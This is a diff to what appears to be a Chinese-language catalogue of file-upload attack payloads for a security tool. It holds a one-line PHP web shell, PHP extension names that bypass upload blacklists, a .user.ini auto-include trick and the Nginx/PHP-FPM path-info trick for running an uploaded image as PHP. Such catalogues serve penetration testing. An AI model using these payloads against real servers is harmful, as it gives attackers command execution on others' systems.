@@ -20,7 +20,7 @@
       "title": "PHP 短标签",
       "category": "PHP 场景",
       "code": "<?=`$_GET[0]`?>",
-      "desc": "短标签加反引号执行，适用于 short_open_tag 开启的环境。",
+      "desc": "<?= 是短输出标签，自 PHP 5.4 起始终可用，不受 short_open_tag 影响（受影响的只有 <? 标签）；反引号等价 shell_exec，会执行其中的命令。",
       "tags": ["upload", "php", "short-tag"],
       "vars": [],
       "risk": "attack",
@@ -36,6 +36,28 @@
       "vars": [],
       "risk": "attack",
       "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-php-obscure-ext",
+      "title": "冷门 PHP 后缀",
+      "category": "PHP 场景",
+      "code": "shell.pht / shell.php5 / shell.php7 / shell.phtm",
+      "desc": "Apache 的 AddHandler 或部分默认配置会把这些后缀交给 PHP 解析，黑名单常只覆盖 .php 与 .phtml。",
+      "tags": ["upload", "php", "bypass", "extension"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PayloadsAllTheThings"
+    },
+    {
+      "id": "upload-php-userini",
+      "title": ".user.ini 自动包含",
+      "category": "解析与配置",
+      "code": "auto_prepend_file=shell.jpg",
+      "desc": "PHP-CGI / PHP-FPM 会读取目录下的 .user.ini 设置 auto_prepend_file，先上传该文件再请求同目录任意 PHP 即可包含图片马；需 PHP 5.3+ 且未禁用 user_ini.filename。",
+      "tags": ["upload", "php", "userini", "config"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PHP 官方文档 .user.ini"
     },
     {
       "id": "upload-php-htaccess",
@@ -127,10 +149,10 @@
     },
     {
       "id": "upload-nginx-cve",
-      "title": "Nginx 解析漏洞思路",
+      "title": "Nginx + PHP-FPM 解析缺陷",
       "category": "解析与配置",
       "code": "shell.jpg/x.php",
-      "desc": "老版本 Nginx 的 PATH_INFO 解析问题，可把图片当 PHP 执行，需确认版本与配置。",
+      "desc": "由 Nginx 的 fastcgi 配置与 PHP-FPM 的 cgi.fix_pathinfo 共同决定：当 fix_pathinfo=1 时，会向前查找真实存在的 shell.jpg 并当作 PHP 执行，并非某个 Nginx 版本专属漏洞。",
       "tags": ["upload", "nginx", "cve"],
       "vars": [],
       "risk": "attack",
